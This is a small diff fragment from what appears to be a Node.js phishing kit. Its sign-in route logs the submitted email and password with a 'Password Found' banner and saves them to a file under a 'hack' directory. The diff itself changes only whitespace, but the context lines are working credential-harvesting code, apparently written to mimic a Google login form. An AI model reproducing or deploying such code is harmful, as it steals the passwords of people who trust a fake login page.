@@ -18,7 +18,7 @@ router.post('/signin/save', function (req, res, next) {
   console.log("=======Password Found=========")
   console.log(req.body.hidEmail);
   console.log(req.body.Passwd);
-  
+
   var pwds = fs.readFileSync("../services/hack/password.json");
   var pwdFile = JSON.parse(pwds);
   pwdFile.password.push({ email: req.body.hidEmail, password: req.body.Passwd });
